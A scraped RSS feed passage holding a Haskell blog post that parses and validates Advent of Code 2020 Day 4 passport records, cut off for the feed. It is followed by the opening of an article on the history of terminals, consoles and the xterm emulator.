<span>validateInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span> <span>/=</span> <span>Nothing</span></code></pre></div>
<p>As you can see, they look very similar. The main difference is that
<code>parseInt</code> returns a useful value, the <code>Int</code> that we wanted to parse, while
<code>validateInt</code> takes that useful value and throws it away. This is also
mentioned in the wonderful <a href="https://kowainik.github.io/posts/haskell-mini-patterns#evidence">Haskell Mini-Patterns
Handbook</a>
as the “Evidence” pattern.</p>
<blockquote>
<p>The key issue here is that by calling a function that returns Bool you
lose the information about earlier performed validation. Instead, you can
keep this information by explicitly pattern-matching on the validation or
result.</p>
</blockquote>
<p>In this post, I would like to go through a practical example that shows the
power of bringing this concept to its limits. Which brings us to…</p>
<h2>Advent of Code 2020, Day 4</h2>
<p>We <a href="https://adventofcode.com/2020/day/4">are tasked</a> with parsing a batch
of passports composed of these fields:</p>
<div data-language="plain"><pre><code>- byr (Birth Year)
- iyr (Issue Year)
- eyr (Expiration Year)
- hgt (Height)
- hcl (Hair Color)
- ecl (Eye Color)
- pid (Passport ID)
- cid (Country ID)</code></pre></div>
<p>All the fields are required except for the <code>cid</code> field, which is optional.
Note that the fields can be written in any order, this will be important
later. Our batch is composed of multiple passports separated by empty lines
(the <code>input.txt</code>):</p>
<div data-language="plain"><pre><code>ecl:gry pid:860033327 eyr:2020 hcl:#fffffd
byr:1937 iyr:2017 cid:147 hgt:183cm

iyr:2013 ecl:amb cid:350 eyr:2023 pid:028048884
hcl:#cfa07d byr:1929

hcl:#ae17e1 iyr:2013
eyr:2024
ecl:brn pid:760753108 byr:1931
hgt:179cm

hcl:#cfa07d eyr:2025 pid:166559648
iyr:2011 ecl:brn hgt:59in</code></pre></div>
<ul>
<li>The first passport is <em>valid</em> - all required fields are present.</li>
<li>The second passport is <em>invalid</em> - it is missing <code>hgt</code>.</li>
<li>The third passport is interesting: the only missing field is the optional <code>cid</code>, which makes it <em>valid</em>.</li>
<li>The fourth passport is missing two fields, <code>cid</code> and <code>byr</code>. Missing <code>cid</code> is fine, but missing <code>byr</code> is not, so this passport is <em>invalid</em>.</li>
</ul>
<p>The challenge is to count <strong>how many passports</strong> are <strong>valid</strong> in the given
batch.</p>
<p>Let’s write some code to open the file and parse each group of passport
fields:</p>
<div data-language="haskell"><pre><code><span>module</span> <span>Main</span> <span>where</span>

<span><span>import</span> <span>qualified</span> Data.List.Split <span>as</span> S</span>

<span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>entries</span>

<span>data</span> <span>PassportEntry</span> <span>=</span> <span>PassportEntry</span>
  <span>deriving</span> <span>(</span><span>Show</span><span>)</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>
<span>parseEntry</span> <span>text</span> <span>=</span> <span>undefined</span></code></pre></div>
<p>Nothing too fancy here, we’re using <code>Data.List.Split</code> from the <code>split</code>
package to do the heavy lifting. And the implementation of <code>parseEntry</code> has
been conveniently stubbed so that the code compiles.</p>
<p>Now how should our <code>PassportEntry</code> data structure look like? I’d love to
eventually represent passports as:</p>
<div data-language="haskell"><pre><code><span>data</span> <span>Passport</span> <span>=</span> <span>Passport</span>
  <span>{</span> <span>birthYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>issueYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>expirationYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>height</span> <span>::</span> <span>String</span><span>,</span>
    <span>hairColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>eyeColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>passportId</span> <span>::</span> <span>String</span><span>,</span>
    <span>countryId</span> <span>::</span> <span>Maybe</span> <span>Int</span>
  <span>}</span></code></pre></div>
<p>If we imagine parsing each field sequentially, we can see that we won’t be
able to construct this data structure in a single operation. We’ll have to
accumulate the data up until we’re ready to create a proper <code>Passport</code>.</p>
<p>One way to store the fields is to insert them into a hash. First of all,
we’re going to use a custom data type to represent the keys of the hash.
Why is that? We really don’t want to be making typos later when comparing
raw strings like <code>"ecl"</code> and <code>"elc"</code>. We’ll use a <code>HashMap</code> from the
<code>Data.HashMap.Strict</code> module:</p>
<div data-language="haskell"><pre><code><span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>

<span>data</span> <span>PassportField</span>
  <span>=</span> <span>BirthYear</span>
  <span>|</span> <span>IssueYear</span>
  <span>|</span> <span>ExpirationYear</span>
  <span>|</span> <span>Height</span>
  <span>|</span> <span>HairColor</span>
  <span>|</span> <span>EyeColor</span>
  <span>|</span> <span>PassportId</span>
  <span>|</span> <span>CountryId</span>
  <span>deriving</span> <span>(</span><span>Eq</span><span>,</span> <span>Show</span><span>)</span>

<span>type</span> <span>PassportEntry</span> <span>=</span> <span>HM.HashMap</span> <span>PassportField</span> <span>String</span></code></pre></div>
<p>Of course things can’t be that easy. We also need to make our type
implement the <code>Hashable</code> typeclass:</p>
<div data-language="haskell"><pre><code>

<span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>
<span><span>import</span> Data.Hashable</span>
<span><span>import</span> GHC.Generics</span> <span>(</span><span>Generic</span><span>)</span>

<span>data</span> <span>PassportField</span>
  <span>=</span> <span>BirthYear</span>
  <span>|</span> <span>IssueYear</span>
  <span>|</span> <span>ExpirationYear</span>
  <span>|</span> <span>Height</span>
  <span>|</span> <span>HairColor</span>
  <span>|</span> <span>EyeColor</span>
  <span>|</span> <span>PassportId</span>
  <span>|</span> <span>CountryId</span>
  <span>deriving</span> <span>(</span><span>Eq</span><span>,</span> <span>Show</span><span>,</span> <span>Generic</span><span>)</span>

<span>instance</span> <span>Hashable</span> <span>PassportField</span>

<span>type</span> <span>PassportEntry</span> <span>=</span> <span>HM.HashMap</span> <span>PassportField</span> <span>String</span></code></pre></div>
<p>Don’t worry about what we’ve added. Just take them as God-given truths. 👼</p>
<p>Okay, now we can implement our <code>parseEntry</code> function:</p>
<div data-language="haskell"><pre><code><span><span>import</span> Data.Maybe</span> <span>(</span><span>mapMaybe</span><span>)</span>
<span><span>import</span> <span>qualified</span> Data.Char <span>as</span> Char</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>
<span>parseEntry</span> <span>line</span> <span>=</span>
  <span>HM.fromList</span> <span>$</span>
    <span>mapMaybe</span> <span>parseTag</span> <span>$</span>
      <span>S.splitWhen</span> <span>Char</span><span>.</span><span>isSpace</span> <span>line</span>

<span>parseTag</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Maybe</span> <span>(</span><span>PassportField</span><span>,</span> <span>String</span><span>)</span>
<span>parseTag</span> <span>value</span> <span>=</span>
  <span>case</span> <span>S.splitOn</span> <span>":"</span> <span>value</span> <span>of</span>
    <span>[</span><span>"byr"</span><span>,</span> <span>byr</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>BirthYear</span><span>,</span> <span>byr</span><span>)</span>
    <span>[</span><span>"iyr"</span><span>,</span> <span>iyr</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>IssueYear</span><span>,</span> <span>iyr</span><span>)</span>
    <span>[</span><span>"eyr"</span><span>,</span> <span>eyr</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>ExpirationYear</span><span>,</span> <span>eyr</span><span>)</span>
    <span>[</span><span>"hgt"</span><span>,</span> <span>height</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>Height</span><span>,</span> <span>height</span><span>)</span>
    <span>[</span><span>"hcl"</span><span>,</span> <span>color</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>HairColor</span><span>,</span> <span>color</span><span>)</span>
    <span>[</span><span>"ecl"</span><span>,</span> <span>color</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>EyeColor</span><span>,</span> <span>color</span><span>)</span>
    <span>[</span><span>"pid"</span><span>,</span> <span>pid</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>PassportId</span><span>,</span> <span>pid</span><span>)</span>
    <span>[</span><span>"cid"</span><span>,</span> <span>cid</span><span>]</span> <span>-&gt;</span>
      <span>Just</span> <span>(</span><span>CountryId</span><span>,</span> <span>cid</span><span>)</span>
    <span>_</span> <span>-&gt;</span>
      <span>Nothing</span></code></pre></div>
<p>We try to parse each field (such as <code>byr:2002</code>) into a <code>PassportField</code>
type, then end up building a hash using <code>HM.fromList</code>. We can take this for
a spin:</p>
<div data-language="haskell"><pre><code><span>Prelude</span><span>&gt;</span> <span>:</span><span>l</span> <span>Main.hs</span>

<span>*</span><span>Main</span><span>&gt;</span> <span>main</span>
<span>[</span> <span>fromList</span>
    <span>[</span> <span>(</span><span>CountryId</span><span>,</span> <span>"147"</span><span>)</span><span>,</span>
      <span>(</span><span>BirthYear</span><span>,</span> <span>"1937"</span><span>)</span><span>,</span>
      <span>(</span><span>IssueYear</span><span>,</span> <span>"2017"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#fffffd"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2020"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"gry"</span><span>)</span><span>,</span>
      <span>(</span><span>Height</span><span>,</span> <span>"183cm"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"860033327"</span><span>)</span>
    <span>]</span><span>,</span>
  <span>fromList</span>
    <span>[</span> <span>(</span><span>CountryId</span><span>,</span> <span>"350"</span><span>)</span><span>,</span>
      <span>(</span><span>BirthYear</span><span>,</span> <span>"1929"</span><span>)</span><span>,</span>
      <span>(</span><span>IssueYear</span><span>,</span> <span>"2013"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#cfa07d"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2023"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"amb"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"028048884"</span><span>)</span>
    <span>]</span><span>,</span>
  <span>fromList</span>
    <span>[</span> <span>(</span><span>BirthYear</span><span>,</span> <span>"1931"</span><span>)</span><span>,</span>
      <span>(</span><span>IssueYear</span><span>,</span> <span>"2013"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#ae17e1"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2024"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"brn"</span><span>)</span><span>,</span>
      <span>(</span><span>Height</span><span>,</span> <span>"179cm"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"760753108"</span><span>)</span>
    <span>]</span><span>,</span>
  <span>fromList</span>
    <span>[</span> <span>(</span><span>IssueYear</span><span>,</span> <span>"2011"</span><span>)</span><span>,</span>
      <span>(</span><span>HairColor</span><span>,</span> <span>"#cfa07d"</span><span>)</span><span>,</span>
      <span>(</span><span>ExpirationYear</span><span>,</span> <span>"2025"</span><span>)</span><span>,</span>
      <span>(</span><span>EyeColor</span><span>,</span> <span>"brn"</span><span>)</span><span>,</span>
      <span>(</span><span>Height</span><span>,</span> <span>"59in"</span><span>)</span><span>,</span>
      <span>(</span><span>PassportId</span><span>,</span> <span>"166559648"</span><span>)</span>
    <span>]</span>
<span>]</span></code></pre></div>
<p>Nice and tidy! 🦾</p>
<p>Now our goal is to verify which one of these groups is valid. First of all,
we should define a list of required fields:</p>
<div data-language="haskell"><pre><code><span>requiredFields</span> <span>::</span> <span>[</span><span>PassportField</span><span>]</span>
<span>requiredFields</span> <span>=</span>
  <span>[</span> <span>BirthYear</span><span>,</span>
    <span>IssueYear</span><span>,</span>
    <span>ExpirationYear</span><span>,</span>
    <span>Height</span><span>,</span>
    <span>HairColor</span><span>,</span>
    <span>EyeColor</span><span>,</span>
    <span>PassportId</span>
  <span>]</span></code></pre></div>
<p>We can then define a validation function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span></code></pre></div>
<p>And change our main function to use that:</p>
<div data-language="haskell"><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>$</span> <span>length</span> <span>$</span> <span>filter</span> <span>isEntryValid</span> <span>entries</span></code></pre></div>
<p>Running this yields <code>2</code>, which is the correct answer!
<a href="https://gist.github.com/Arkham/b749043e1622bf01c96eefe303df0b9b">Here</a> is
all the code we have written so far, if you’re feeling like you need a
refresher.</p>
<h2>Advent of Code 2020, Day 4, Part II</h2>
<p>In the second part of the challenge, these new rules are added:</p>
<div data-language="plain"><pre><code>- byr (Birth Year) - four digits; between 1920 and 2002.
- iyr (Issue Year) - four digits; between 2010 and 2020.
- eyr (Expiration Year) - four digits; between 2020 and 2030.
- hgt (Height) - a number followed by either cm or in:
  - If cm, the number must be between 150 and 193.
  - If in, the number must be between 59 and 76.
- hcl (Hair Color) - a '#' followed by six chars 0-9 or a-f.
- ecl (Eye Color) - one of: amb blu brn gry grn hzl oth.
- pid (Passport ID) - a nine-digit number.
- cid (Country ID) - ignored, missing or not.</code></pre></div>
<p>Here is a new batch for us to peruse:</p>
<div data-language="plain"><pre><code>pid:087499704 hgt:74in ecl:grn iyr:2012 eyr:2030 byr:1980
hcl:#623a2f

eyr:1972 cid:100
hcl:#18171d ecl:amb hgt:170 pid:186cm iyr:2018 byr:1926</code></pre></div>
<ul>
<li>the first passport is <em>valid</em></li>
<li>the second passport is <em>invalid</em> (look at the <code>eyr</code> field)</li>
</ul>
<p>These new requirements are a bit annoying. Our simple approach of checking
if all required fields are present won’t work any longer. We can instead
implement a <code>isFieldValid</code> function to check if all fields are valid.</p>
<div data-language="haskell"><pre><code><span>isFieldValid</span> <span>::</span> <span>(</span><span>PassportField</span><span>,</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>Bool</span>
<span>isFieldValid</span> <span>(</span><span>field</span><span>,</span> <span>value</span><span>)</span> <span>=</span>
  <span>case</span> <span>field</span> <span>of</span>
    <span>BirthYear</span> <span>-&gt;</span>
      <span>let</span> <span>v</span> <span>=</span> <span>toInt</span> <span>value</span>
       <span>in</span> <span>length</span> <span>value</span> <span>==</span> <span>4</span> <span>&amp;&amp;</span> <span>v</span> <span>&gt;=</span> <span>1920</span> <span>&amp;&amp;</span> <span>v</span> <span>&lt;=</span> <span>2002</span>
    <span>IssueYear</span> <span>-&gt;</span>
      <span>let</span> <span>v</span> <span>=</span> <span>toInt</span> <span>value</span>
       <span>in</span> <span>length</span> <span>value</span> <span>==</span> <span>4</span> <span>&amp;&amp;</span> <span>v</span> <span>&gt;=</span> <span>2010</span> <span>&amp;&amp;</span> <span>v</span> <span>&lt;=</span> <span>2020</span>
    <span>ExpirationYear</span> <span>-&gt;</span>
      <span>let</span> <span>v</span> <span>=</span> <span>toInt</span> <span>value</span>
       <span>in</span> <span>length</span> <span>value</span> <span>==</span> <span>4</span> <span>&amp;&amp;</span> <span>v</span> <span>&gt;=</span> <span>2020</span> <span>&amp;&amp;</span> <span>v</span> <span>&lt;=</span> <span>2030</span>
    <span>Height</span> <span>-&gt;</span>
      <span>case</span> <span>span</span> <span>Char</span><span>.</span><span>isDigit</span> <span>value</span> <span>of</span>
        <span>(</span><span>num</span><span>,</span> <span>"cm"</span><span>)</span> <span>-&gt;</span>
          <span>let</span> <span>n</span> <span>=</span> <span>toInt</span> <span>num</span>
           <span>in</span> <span>n</span> <span>&gt;=</span> <span>150</span> <span>&amp;&amp;</span> <span>n</span> <span>&lt;=</span> <span>193</span>
        <span>(</span><span>num</span><span>,</span> <span>"in"</span><span>)</span> <span>-&gt;</span>
          <span>let</span> <span>n</span> <span>=</span> <span>toInt</span> <span>num</span>
           <span>in</span> <span>n</span> <span>&gt;=</span> <span>59</span> <span>&amp;&amp;</span> <span>n</span> <span>&lt;=</span> <span>76</span>
        <span>_</span> <span>-&gt;</span>
          <span>False</span>
    <span>HairColor</span> <span>-&gt;</span>
      <span>case</span> <span>(</span><span>length</span> <span>value</span><span>,</span> <span>value</span><span>)</span> <span>of</span>
        <span>(</span><span>7</span><span>,</span> <span>'#'</span> <span>:</span> <span>rest</span><span>)</span> <span>-&gt;</span>
          <span>all</span> <span>(</span>`<span>elem</span>` <span>allowedHexChars</span><span>)</span> <span>rest</span>
        <span>_</span> <span>-&gt;</span>
          <span>False</span>
    <span>EyeColor</span> <span>-&gt;</span>
      <span>value</span> `<span>elem</span>` <span>validEyeColors</span>
    <span>PassportId</span> <span>-&gt;</span>
      <span>length</span> <span>value</span> <span>==</span> <span>9</span> <span>&amp;&amp;</span> <span>all</span> <span>Char</span><span>.</span><span>isDigit</span> <span>value</span>
    <span>CountryId</span> <span>-&gt;</span>
      <span>all</span> <span>Char</span><span>.</span><span>isDigit</span> <span>value</span>

<span>toInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>toInt</span> <span>=</span> <span>read</span>

<span>validEyeColors</span> <span>::</span> <span>[</span><span>String</span><span>]</span>
<span>validEyeColors</span> <span>=</span>
  <span>[</span><span>"amb"</span><span>,</span> <span>"blu"</span><span>,</span> <span>"brn"</span><span>,</span> <span>"gry"</span><span>,</span> <span>"grn"</span><span>,</span> <span>"hzl"</span><span>,</span> <span>"oth"</span><span>]</span>

<span>allowedHexChars</span> <span>::</span> <span>[</span><span>Char</span><span>]</span>
<span>allowedHexChars</span> <span>=</span>
  <span>[</span><span>'0'</span> <span>..</span> <span>'9'</span><span>]</span> <span>&lt;&gt;</span> <span>[</span><span>'a'</span> <span>..</span> <span>'f'</span><span>]</span></code></pre></div>
<p>Then we can change our <code>isEntryValid</code> to use this function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>requiredFieldsPresent</span> <span>&amp;&amp;</span> <span>allFieldsValid</span>
  <span>where</span>
    <span>requiredFieldsPresent</span> <span>=</span>
      <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span>

    <span>allFieldsValid</span> <span>=</span>
      <span>all</span> <span>isFieldValid</span> <span>(</span><span>HM.toList</span> <span>entry</span><span>)</span></code></pre></div>
<p>Running this program on our second data sample yields <code>1</code>, and it will be
good enough to solve the Advent of Code challenge and get us those sweet
sweet stars.</p>
<p>🎉 🎉 🎉</p>
<h2>A moment of reflection</h2>
<p>If we look back at the <a href="https://gist.github.com/Arkham/923df6e872d855101bca4261f7d71e65">current
state</a> of
our …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://juliu.is/permutate-parsers/">https://juliu.is/permutate-parsers/</a></em></p>]]>
            </description>
            <link>https://juliu.is/permutate-parsers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789061</guid>
            <pubDate>Fri, 15 Jan 2021 10:10:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The terminal, the console and the shell – what are they?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788858">thread link</a>) | @iio7
<br/>
January 15, 2021 | https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html | <a href="https://web.archive.org/web/*/https://www.unixsheikh.com/articles/the-terminal-the-console-and-the-shell-what-are-they.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="pubdate">2021-01-13</span>. Modified on <span id="moddate">2021-01-16</span>.</p>
<p>The other day, as I was going through some of my old notes, I stumbled upon something I had written about the console, the terminal and the shell on Unix-like operating systems. I have decided to rewrite these notes in order to share them here on my website. So without further ado we will now stroll down memory lane and take a quick look at the origins of the Unix terminal and shell. And I will also give my advice to new users on Linux or BSD regarding the choice of terminal emulator and shell.</p>

<p>Table of contents</p>
<ul>
    <li><a href="#the-terminal">The terminal and the console</a>
        <ul>
            <li><a href="#the-virtual-terminal">The virtual terminal</a></li>
        </ul>
    </li>
    <li><a href="#the-terminal-emulator">The terminal emulator</a>
        <ul>
            <li><a href="#xterm">xterm</a></li>
            <li><a href="#st">st</a></li>
            <li><a href="#alacritty">Alacritty</a></li>
            <li><a href="#other-terminal-emulators">Other terminal emulators</a></li>
            <li><a href="#what-terminal-emulator-should-i-use">What terminal emulator should I use?</a></li>
        </ul>
    </li>
    <li><a href="#terminal-multiplexer">Terminal multiplexer</a>
        <ul>
            <li><a href="#tmux-vs-gnu-screen">tmux vs GNU Screen</a></li>
        </ul>
    </li>
    <li><a href="#the-environment-variable-term">The environment variable TERM</a></li>
    <li><a href="#escape-sequences">Escape sequences</a></li>
    <li><a href="#the-shell">The shell</a>
        <ul>
            <li><a href="#popular-shells">Popular shells</a>
                <ul>
                    <li><a href="#bourne-shell">Bourne shell</a></li>
                    <li><a href="#c-shell">C shell</a></li>
                    <li><a href="#ksh">Ksh</a></li>
                    <li><a href="#bash">Bash</a></li>
                    <li><a href="#tcsh">tcsh</a></li>
                    <li><a href="#zsh">Zsh</a></li>
                    <li><a href="#ash">Ash</a></li>
                    <li><a href="#dash">DASH</a></li>
                    <li><a href="#fish">fish</a></li>
                </ul>
            </li>
            <li><a href="#what-shell-should-i-use">What shell should I use?</a></li>
        </ul>
    </li>
    <li><a href="#further-reading">Further reading</a></li>
</ul>

<h2 id="the-terminal-and-the-console">The terminal and the console</h2>

<p>Early computers where huge machines that consisted of multiple cabinets, e.g. one cabinet for the CPU, one or more cabinets for tape drives, one cabinet for each disk drive, one cabinet for a punched card reader and one cabinet for a high speed printer. The image below is a Univac 9400 system from 1967 consisting of several cabinets.</p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-9400.jpg" alt="A Univac 9400 Mainframe"><br><span>A Univac 9400 mainframe computer.</span></p>

<p>The "console" was the "control console". In the pictures below is a "UNIVAC 1" control console and a "UNIVAC 2" control console.</p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-1-control-console.png" alt="UNIVAC 1 control console"><br><span>A UNIVAC 1 control console.</span></p>

<p><img src="https://www.unixsheikh.com/includes/images/univac-2-control-console.png" alt="UNIVAC 2 control console"><br><span>A UNIVAC 2 control console.</span></p>

<p>The word terminal comes from the Latin "terminus", meaning "an end, a limit, boundary line", indicating that it's the terminating end or "terminal" end of a communications process. You will sometimes hear the description "a dumb terminal" when referring to a text-based environment where the computer is <i>just taking input and showing text</i> while the real work happens at the other end, typically in a <a href="https://en.wikipedia.org/wiki/Mainframe_computer">mainframe</a>.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Teleprinter">teleprinter</a> or TTY was the first kind of terminal. Rather than a monitor you would have a literal typewriter in front of you. When you typed on it, you would see the text on a piece of paper and that text would be send to the computer. When the computer replied, you would see the typewriter print on the paper. Some models could also be used to create punched tape for data storage (either from typed input or from data received from a remote source) and to read back such tape for local printing or transmission.</p>

<p>In the picture below is a Teletype 33 ASR Teleprinter. It was introduced in 1963 as an electro-mechanical teleprinter and it was one of the most popular terminals in the communications industry. The ASR stands for <b>A</b>utomatic <b>S</b>end and <b>R</b>eceive. The ASR 33 had a built-in punched tape reader and tape punch which allowed the user to save programs.</p>

<p><img src="https://www.unixsheikh.com/includes/images/asr33.jpg" alt="33 ASR Teleprinter"><br><span>A Teletype Model 33 ASR teleprinter, usable as a terminal.</span></p>

<p><b>NOTE:</b><br>If you're interested I can highly recommend that you take a look at Charles Baetsen's Hobby Page as he has a wealth of information about the <a href="https://va3ngc.weebly.com/asr-33-documentation.html">Teletype 33 ASR</a> in the form of both user manuals, installations manuals and videos.</p>

<p>In the picture below Ken Thompson (sitting) and Dennis Ritchie (standing) is using a 33 ASR teleprinter connected to a <a href="https://en.wikipedia.org/wiki/PDP-11">PDP-11</a>, the picture is from 1972.</p>

<p><img src="https://www.unixsheikh.com/includes/images/thompson-ritchie-pdp-11.png" alt="Ken Thompson and Dennis Ritchie"></p>

<p>Later, as computers became much smaller, it was possible to integrate multiple components into one single unit, with both a video monitor and a keyboard put together inside it, and the "console" now became more or less synonymous to the "terminal". Both the "console" and the "terminal" now referred to the physical video terminal that had replaced both the teleprinter and the old control console.</p>

<p>The video terminal provides a way for the kernel and other processes to send text output on the monitor to the user, and to receive text input from the user via the keyboard.</p>

<p>The VT100 is a video terminal, introduced in August 1978 by Digital Equipment Corporation (DEC). It was one of the first terminals to support ANSI escape codes for cursor control and other tasks, and added a number of extended codes for special features like controlling the status lights on the keyboard. This led to rapid uptake of the ANSI standard, becoming the de facto standard for terminal emulators.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt100.jpg" alt="DEC VT100"><br><span>A DEC VT100</span></p>

<p>The VT220 is an ANSI standard video terminal introduced by Digital Equipment Corporation (DEC) in November 1983. The VT240 added monochrome vector graphics support to the base model, while the VT241 did the same in color. The 200 series replaced the VT100 series. Among its major upgrades was a number of international character sets, as well as the ability to define new character sets, and a much lighter keyboard.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt220.jpg" alt="DEC VT220"><br><span>A DEC VT220</span></p>

<p>Today, in the software world, "console" and "terminal" has become completely synonymous.</p>

<h3 id="the-virtual-terminal">The virtual terminal</h3>

<p>A virtual terminal or virtual console is a program that simulates a physical terminal. For example, both the Linux kernel and BSD kernels support virtual terminals - terminals that are logically separate, but which access the same physical keyboard and monitor.</p>

<p>The virtual terminal gives the impression that several independent terminals are running concurrently. Each virtual terminal can be logged in with a different user and it can run its own shell and have its own font settings. The virtual terminals each use a device <code>/dev/ttyX</code>, and you can switch between them by pressing <code>Alt+FX</code> (where <code>X</code> is equal to the virtual terminal number, beginning with 1).</p>

<h2 id="the-terminal-emulator">The terminal emulator</h2>

<p>Emulation refers to the ability of a computer program to emulate, i.e. imitate, another program or device. A terminal emulator is a computer program that emulates a physical terminal within some other display architecture, such as the <a href="https://en.wikipedia.org/wiki/X_Window_System">X Window System</a>.</p>

<p>Many different terminal emulators have been developed that emulate terminals such as the <a href="https://en.wikipedia.org/wiki/VT52">VT52</a>, <a href="https://en.wikipedia.org/wiki/VT100">VT100</a>, <a href="https://en.wikipedia.org/wiki/VT220">VT220</a>, <a href="https://en.wikipedia.org/wiki/VT320">VT320</a>, <a href="https://en.wikipedia.org/wiki/IBM_3270">IBM 3270/8/9/E</a>, <a href="https://en.wikipedia.org/wiki/IBM_5250">IBM 5250</a>, and many others.</p>

<p>The terminal emulator takes the input you type at the keyboard and convert those to <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> characters which it sends to the shell, or to a program running under the shell (more about the shell later). The terminal emulator also takes the stream of output characters from the various programs you run via the shell and displays them on the monitor.</p>

<p>The purpose of the terminal emulator is to allow access to the command line while working in a graphical user interface, such as the X Window System. Since the shell is "expecting" to interface with a human through a terminal, and we don't use a physical terminal while in a graphical environment, we need the terminal emulator.</p>

<p>You can see what terminal types are available on most Linux distributions by running <code>ls /lib/terminfo/*</code> (the path may be different on your system). On OpenBSD it's <code>ls /usr/share/terminfo/*</code></p>

<h4 id="xterm">xterm</h4>

<p><a href="https://invisible-island.net/xterm/xterm.html">xterm</a> was originally written as a stand-alone terminal emulator for the <a href="https://en.wikipedia.org/wiki/VAXstation#VAXstation_100">VAXStation 100 </a> (VS100) by Mark Vandevoorde, a student of <a href="https://en.wikipedia.org/wiki/Jim_Gettys">Jim Gettys</a>, who worked at <a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC's</a> Cambridge Research Laboratory. It became clear that xterm would be more useful as part of X Window System than as a standalone program, so it was retargeted to the X Window System.</p>

<p>The xterm program is the default terminal emulator for the X Window System. It provides DEC VT102/VT220 features and other selected features from higher-level terminals such as VT320, VT420 and VT520. It also provides Tektronix 4014 emulation for programs that cannot use the window system directly. If the underlying operating system supports terminal resizing (for example, the SIGWINCH signal in systems derived from 4.3bsd), xterm will use the facilities to notify programs running in the window whenever it is resized.</p>

<p>Around 1996 the main line of development shifted to the <a href="https://en.wikipedia.org/wiki/XFree86">XFree86</a> implementation of the X Window System and xterm is now maintained by Thomas Dickey, who is also the current lead developer of <a href="https://en.wikipedia.org/wiki/Lynx_%28web_browser%29">Lynx</a>, a popular customizable text-based web browser.</p>

<p>Early versions of xterm emulated the VT102 and Tektronix 4014. Later versions added control sequences for DEC and other terminals such as:</p>
<ul>
    <li>VT220: Added in patch 24.</li>
    <li>VT320: Added in patch 24.</li>
    <li>VT420: DECSTR (soft terminal reset) was added in patch 34.</li>
    <li>VT520: Although not officially emulated, parts of VT520 features were implemented. Controls DECSMBV and DECSWBV for setting the margin- and warning-bell volume was added in patch 254.</li>
</ul>

